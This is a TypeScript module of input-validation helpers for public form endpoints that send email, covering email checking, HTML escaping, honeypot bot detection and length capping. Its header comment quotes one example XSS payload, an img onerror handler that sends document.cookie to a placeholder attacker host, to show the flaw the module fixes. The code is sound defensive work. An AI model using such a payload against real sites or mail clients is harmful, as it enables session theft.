/**
 * Validation + sanitization helpers for public-facing endpoints.
 *
 * We have ~7 unauthenticated POST routes that accept user input AND send
 * email (lead forms, newsletter signup, booking requests). Before this
 * module every one of them was:
 *   - trusting whatever string the caller passed for `email`
 *     (we only checked presence with `!email`)
 *   - interpolating `${name}`, `${phone}`, `${email}` raw into the
 *     owner-notification HTML — so a payload like
 *     `{"name":"<img src=x onerror=fetch('//evil/?c='+document.cookie)>"}`
 *     would render as live HTML inside Resend and any email client that
 *     isn't strictly sandboxed
 *   - accepting form submissions with no bot defense, so the cost-per-
 *     send (both Resend quota AND the branded-sender reputation) was
 *     whatever a spammer wanted it to be
 *
 * These three helpers fix all three vectors with near-zero runtime cost.
 * Import from `@/lib/validation` in every public POST that accepts
 * user-supplied strings or echoes them into email.
 */

/**
 * Browser-compatible email regex. Accepts the RFC-5322 practical subset —
 * local@domain.tld with at least one dot in the domain. Same pattern we
 * use in the client-side LeadForm so client + server behave identically
 * and we don't reject things the UI just let through (or vice versa).
 *
 * Intentionally simpler than the full RFC; strict RFC regex is hundreds
 * of chars and accepts addresses no real mail server delivers to.
 */
export const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

export function isValidEmail(value: unknown): value is string {
  if (typeof value !== "string") return false;
  const trimmed = value.trim();
  // Reject zero-length and anything that would make Resend choke. Hard
  // cap at 254 because that's the real SMTP limit for a full address.
  if (trimmed.length === 0 || trimmed.length > 254) return false;
  return EMAIL_REGEX.test(trimmed);
}

/**
 * Escape the five characters that matter for HTML context. Used when
 * we take user input (name, phone, company, message) and drop it into
 * an email-template string. Without this, `<script>` and `"` break out
 * of the context the author expected.
 *
 * Deliberately minimal — this is for text nodes and double-quoted
 * attribute values, which covers every email-template case in the
 * codebase. For URL contexts use encodeURIComponent, for JS contexts
 * don't do that in the first place.
 */
export function escapeHtml(input: unknown): string {
  if (input === null || input === undefined) return "";
  const s = String(input);
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/**
 * Honeypot check. Every public form gets a hidden `<input name="website">`
 * (or similar) that's invisible to real users but auto-filled by most
 * dumb spambots. If the field comes back with any value, we treat the
 * submission as a bot and return `true` here — the caller should 200 OK
 * silently (not 4xx — that gives the bot a signal to try again with a
 * different field name).
 */
export function isBotSubmission(body: Record<string, unknown>): boolean {
  // Accept any of the common decoy names so we can rotate without
  // breaking existing forms.
  const decoys = ["website", "url", "company_website", "hp"];
  for (const key of decoys) {
    const val = body[key];
    if (typeof val === "string" && val.trim().length > 0) return true;
  }
  return false;
}

/**
 * Trim + length-cap a free-text field. Defaults to 500 chars, which is
 * longer than any legitimate name/phone/company value but short enough
 * to prevent someone from shoving a megabyte of garbage into an email
 * template. Returns empty string for non-strings so callers can presence-
 * check with one `!` rather than a type guard + trim.
 */
export function sanitizeText(value: unknown, maxLength = 500): string {
  if (typeof value !== "string") return "";
  return value.trim().slice(0, maxLength);
}
